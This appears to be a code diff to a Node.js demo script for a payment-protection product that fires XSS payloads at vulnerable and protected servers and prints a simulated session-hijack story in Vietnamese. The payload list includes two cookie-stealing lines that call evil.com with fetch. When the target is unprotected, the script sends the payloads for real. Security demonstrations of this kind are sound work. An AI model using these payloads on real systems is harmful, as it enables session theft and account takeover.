@@ -18,7 +18,12 @@ const PAYLOADS = [
     { payload: 'javascript:void(document.cookie)', type: 'dom' },
     { payload: "<iframe src='javascript:alert(1)'></iframe>", type: 'stored' },
     { payload: "<svg onload=fetch('http://evil.com?c='+document.cookie)>", type: 'dom' },
+    // Specific demo payload used in scenario: steals cookie via fetch to attacker domain
+    { payload: "<script>fetch('http://evil.com?c='+document.cookie)</script>", type: 'stored' },
 ];
+
+const SIMULATE = typeof process.env.PAYGUARD_SIMULATE !== 'undefined' ? process.env.PAYGUARD_SIMULATE !== 'false' : null;
+const SIMULATED_STOLEN_COOKIE = process.env.SIMULATED_STOLEN_COOKIE || 'session=eyJhbGc...';
 
 const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
@@ -80,6 +85,46 @@ function renderComparisonRow(label, vulnerableResponse, protectedResponse) {
 }
 
 async function main() {
+    // auto-detect remote security mode if PAYGUARD_SIMULATE not explicitly set
+    async function fetchSecurityEnabled() {
+        try {
+            const client = TARGETS.vulnerable.protocol === 'https:' ? require('https') : require('http');
+            const options = {
+                protocol: TARGETS.vulnerable.protocol,
+                hostname: TARGETS.vulnerable.hostname,
+                port: TARGETS.vulnerable.port,
+                path: '/api/payguard/status',
+                method: 'GET',
+                headers: { 'Content-Type': 'application/json' },
+            };
+
+            return await new Promise((resolve) => {
+                const req = client.request(options, (res) => {
+                    let data = '';
+                    res.on('data', (chunk) => { data += chunk; });
+                    res.on('end', () => {
+                        try {
+                            const parsed = data ? JSON.parse(data) : {};
+                            resolve(parsed.securityEnabled === true);
+                        } catch (e) {
+                            resolve(null);
+                        }
+                    });
+                });
+                req.on('error', () => resolve(null));
+                req.end();
+            });
+        } catch (e) {
+            return null;
+        }
+    }
+
+    let simulateMode = SIMULATE;
+    if (simulateMode === null) {
+        const remote = await fetchSecurityEnabled();
+        // simulate when remote security is enabled; when unprotected perform real actions
+        simulateMode = remote === true;
+    }
     console.log(`${BOLD}${YELLOW}XSS ATTACK DEMO${RESET}`);
     console.log(`${CYAN}${'Payload'.padEnd(36)}${RESET} ${CYAN}${'Vulnerable'.padEnd(24)}${RESET} ${CYAN}Protected${RESET}`);
     console.log(`${'-'.repeat(36)} ${'-'.repeat(24)} ${'-'.repeat(24)}`);
@@ -92,6 +137,20 @@ async function main() {
         const protectedResponse = await requestJson(TARGETS.protected, requestBody);
 
         renderComparisonRow(`Payload ${i + 1}`, vulnerableResponse, protectedResponse);
+
+        // If simulation mode and payload looks like the demo steal payload, simulate stored XSS flow
+        if (simulateMode && payload.payload.includes("evil.com")) {
+            console.log(`${YELLOW}[XSS] Injecting payload vào trường "Nội dung chuyển khoản":${RESET}`);
+            console.log(`${YELLOW}[XSS] Payload: ${payload.payload}${RESET}`);
+            console.log(`${GREEN}[XSS] Stored in database ✓${RESET}`);
+            await wait(800);
+            console.log(`${YELLOW}[XSS] Victim opens transaction history...${RESET}`);
+            await wait(500);
+            console.log(`${RED}[XSS] Script executes! Cookie sent to attacker:${RESET}`);
+            console.log(`${CYAN}[XSS] ${SIMULATED_STOLEN_COOKIE} (JWT token bị đánh cắp!)${RESET}`);
+            console.log(`${YELLOW}[SUMMARY] Session hijacking thành công | Tài khoản bị chiếm${RESET}`);
+            break;
+        }
 
         if (i < PAYLOADS.length - 1) {
             await wait(500);
